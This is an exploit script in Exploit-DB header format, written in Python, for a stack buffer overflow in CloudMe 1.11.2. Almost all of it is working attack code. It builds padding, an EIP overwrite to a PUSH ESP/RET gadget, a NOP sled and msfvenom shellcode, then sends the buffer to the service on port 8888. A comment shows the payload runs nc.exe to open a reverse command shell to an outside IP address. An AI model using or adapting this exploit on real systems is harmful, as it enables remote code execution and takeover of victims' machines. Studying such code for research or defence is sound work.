# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.16.9 2953' -b '\x00\x0a\x0d' -f py -v payload
payload =  b""
payload += b"\xda\xcb\xb8\x7a\xe1\xc4\x08\xd9\x74\x24\xf4\x5b"
payload += b"\x2b\xc9\xb1\x3e\x31\x43\x18\x83\xc3\x04\x03\x43"
payload += b"\x6e\x03\x31\xf4\x66\x41\xba\x05\x76\x26\x32\xe0"
payload += b"\x47\x66\x20\x60\xf7\x56\x22\x24\xfb\x1d\x66\xdd"
payload += b"\x88\x50\xaf\xd2\x39\xde\x89\xdd\xba\x73\xe9\x7c"
payload += b"\x38\x8e\x3e\x5f\x01\x41\x33\x9e\x46\xbc\xbe\xf2"
payload += b"\x1f\xca\x6d\xe3\x14\x86\xad\x88\x66\x06\xb6\x6d"
payload += b"\x3e\x29\x97\x23\x35\x70\x37\xc5\x9a\x08\x7e\xdd"
payload += b"\xff\x35\xc8\x56\xcb\xc2\xcb\xbe\x02\x2a\x67\xff"
payload += b"\xab\xd9\x79\xc7\x0b\x02\x0c\x31\x68\xbf\x17\x86"
payload += b"\x13\x1b\x9d\x1d\xb3\xe8\x05\xfa\x42\x3c\xd3\x89"
payload += b"\x48\x89\x97\xd6\x4c\x0c\x7b\x6d\x68\x85\x7a\xa2"
payload += b"\xf9\xdd\x58\x66\xa2\x86\xc1\x3f\x0e\x68\xfd\x20"
payload += b"\xf1\xd5\x5b\x2a\x1f\x01\xd6\x71\x75\xd4\x64\x0c"
payload += b"\x3b\xd6\x76\x0f\x6b\xbf\x47\x84\xe4\xb8\x57\x4f"
payload += b"\x41\x36\x12\xd2\xe3\xdf\xfb\x86\xb6\xbd\xfb\x7c"
payload += b"\xf4\xbb\x7f\x75\x84\x3f\x9f\xfc\x81\x04\x27\xec"
payload += b"\xfb\x15\xc2\x12\xa8\x16\xc7\x50\x74\xb5\x90\x37"
payload += b"\xe5\x35\x11\xe4\x9d\xc1\xb5\x7b\x3e\x59\x6a\xe3"
payload += b"\xb9\xf0\xce\x9e\x49\x67\x80\x01\xcd\x2b\x30\xa1"
payload += b"\x23\xb1\xb4\x40\x1b\x14\x20\xab\x38\x0b\xce\x85"
payload += b"\xdb\xab\x6b\xfa\x12\x7c\x5a\xcb\x64\x52\x93\x1d"
payload += b"\xaa\x93\xf3\x53\x8b\xd6\xc0\x93"


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
